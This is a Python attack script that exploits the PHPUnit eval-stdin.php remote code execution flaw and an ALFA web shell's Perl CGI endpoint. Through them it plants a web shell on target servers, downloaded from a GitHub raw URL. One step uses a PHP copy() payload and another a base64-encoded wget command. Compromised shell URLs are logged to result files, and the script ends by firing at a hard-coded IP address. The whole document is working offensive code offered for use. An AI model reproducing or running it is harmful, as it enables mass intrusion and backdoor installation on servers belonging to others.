import requests


class Shellup:
    def __init__(self):
        self.path = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        self.data1 = '<?php echo "EmperorsTools";?>'
        self.data2 = "<?php copy('https://raw.githubusercontent.com/president32/uploader2/main/emperor.php'," \
                     "'emperorstools.php');readfile('emperorstools.php'); ?> "
        self.data3 = 'd2dldCAtTyBlbXBlcm9yc3Rvb2xzLnBocCBodHRwczovL3Jhd' \
                     'y5naXRodWJ1c2VyY29udGVudC5jb20vcHJlc2lkZW50MzIvdXBsb2FkZXIyL21haW4vZW1wZXJvci5waHA'
        self.timeout = 15
        self.filename = 'Results/Laravel_Shells.txt'
        self.filename2 = 'Results/AlphaPerl_Shells.txt'
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/93.0.4577.82 Safari/537.36 '
        }
        self.headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile '
                          'Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                      '*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 '
        }
        self.path2 = ['/alfacgiapi', '/wordpress/alfacgiapi', '/wp/alfacgiapi', '/wp-content/alfacgiapi',
                      '/blog/alfacgiapi']

    def phpunit(self, url):
        try:
            ex_url = url + self.path
            req = requests.post(ex_url, data=self.data1, headers=self.headers, timeout=self.timeout, verify=False)
            if req.status_code == 200 and 'EmperorsTools' in req.text:
                req2 = requests.post(ex_url, data=self.data2, headers=self.headers, timeout=self.timeout, verify=False)
                if 'BY EMPERORSTOOLS' in req2.text:
                    shell = ex_url.replace('eval-stdin.php', 'emperorstools.php')
                    schrijven = open(self.filename, 'a')
                    schrijven.write(shell + '\n')
                    schrijven.close()
                    return True
            else:
                return False
        except requests.exceptions.ConnectionError:
            return False
        except Exception as e:
            print(e)
            return False

    def alfarce(self, url):
        for pathe in self.path2:
            try:
                ex_url = url + pathe
                requests.post(ex_url + '/perl.alfa', data={
                    'cmd': self.data3},
                              headers=self.headers2, timeout=15, allow_redirects=False, verify=False)
                zoek1 = requests.get(ex_url + '/emperorstools.php', headers=self.headers2, timeout=8,
                                     allow_redirects=False, verify=False).text
                if "BY EMPERORSTOOLS" in zoek1:
                    dom = ex_url + '/emperorstools.php'
                    schrijven = open(self.filename2, 'a')
                    schrijven.write(dom + '\n')
                    schrijven.close()
                    return True
            except requests.exceptions.ConnectionError:
                pass
            except Exception as e:
                pass


Shellup().phpunit("http://18.119.67.151:80")